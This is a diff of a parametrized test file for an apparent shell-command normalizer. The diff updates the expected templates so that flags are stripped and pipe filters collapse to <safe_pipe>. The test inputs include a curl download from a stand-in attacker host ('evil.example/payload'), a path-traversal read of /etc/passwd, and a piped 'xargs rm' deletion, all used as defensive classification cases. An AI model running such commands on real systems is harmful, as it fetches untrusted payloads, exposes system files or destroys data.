@@ -12,22 +12,22 @@ ENV = {"HOME": "/home/test"}
     "raw,expected_template",
     [
         # Basic
-        ("ls -la /tmp/foo", "ls -la <tmp_path>"),
+        ("ls -la /tmp/foo", "ls <tmp_path>"),  # -la stripped (ls in SAFE_FLAG_STRIP_VERBS)
         ("cat ./README.md", "cat <cwd_path>"),
-        ("head -n 50 ./log", "head -n <n> <cwd_path>"),
+        ("head -n 50 ./log", "head <n> <cwd_path>"),  # -n stripped (head in SAFE_FLAG_STRIP_VERBS)
         ("grep 'foo bar' /tmp/log", "grep <arg> <tmp_path>"),
         ("echo $HOME", "echo <home_path>"),  # $HOME expands to known env value → path
         ("ls ~/Downloads", "ls <home_path>"),
         ("ls *.py", "ls <glob>"),
         ("echo hello > ./out.txt", "echo hello > <cwd_path>"),
-        # URLs
-        ("curl -s https://api.github.com/repos/x/y", "curl -s <safe_url>"),
-        ("curl -s https://evil.example/payload", "curl -s <unsafe_url>"),
-        ("curl -s ftp://example.com/x", "curl -s <unsafe_url>"),
-        # Pipes — each segment normalized
-        ("cat /tmp/x.json | jq '.foo'", "cat <tmp_path> | jq <arg>"),
-        ("ls -la | head -n 20", "ls -la | head -n <n>"),
-        ("find /tmp -name '*.log' | xargs rm", "find <tmp_path> -name <arg> | xargs rm"),
+        # URLs — flags stripped for curl (in SAFE_FLAG_STRIP_VERBS)
+        ("curl -s https://api.github.com/repos/x/y", "curl <safe_url>"),
+        ("curl -s https://evil.example/payload", "curl <unsafe_url>"),
+        ("curl -s ftp://example.com/x", "curl <unsafe_url>"),
+        # Pipes — safe pipe-filter segments collapsed to <safe_pipe>
+        ("cat /tmp/x.json | jq '.foo'", "cat <tmp_path> | <safe_pipe>"),
+        ("ls -la | head -n 20", "ls | <safe_pipe>"),  # ls flags stripped + head collapsed
+        ("find /tmp -name '*.log' | xargs rm", "find <tmp_path> <arg> | xargs rm"),  # -name stripped; xargs not in SAFE_PIPE_FILTERS
         # Compound chains
         (
             "mkdir -p ./build && cd ./build && cmake ..",
@@ -59,15 +59,15 @@ ENV = {"HOME": "/home/test"}
         ("echo log >> ./logfile", "echo log >> <cwd_path>"),
         # Variable assignment + command (key=value as leading token)
         ("FOO=bar python ./x.py", "FOO=<arg> python <cwd_path>"),
-        # Real-world Azure DevOps
+        # Real-world Azure DevOps — -s stripped (curl in SAFE_FLAG_STRIP_VERBS)
         (
             "curl -s 'https://dev.azure.com/conda-forge/feedstock-builds/_apis/build/builds/1421644/logs/45'",
-            "curl -s <safe_url>",
+            "curl <safe_url>",
         ),
-        # Real-world gh + jq
+        # Real-world gh + jq — gh not in SAFE_FLAG_STRIP_VERBS; jq pipe collapsed
         (
             "gh pr list --json number,title | jq '.[] | select(.number > 100)'",
-            "gh pr list --json number,title | jq <arg>",
+            "gh pr list --json number,title | <safe_pipe>",
         ),
         # Path traversal must resolve
         ("cat ./foo/../../../etc/passwd", "cat <etc_path>"),
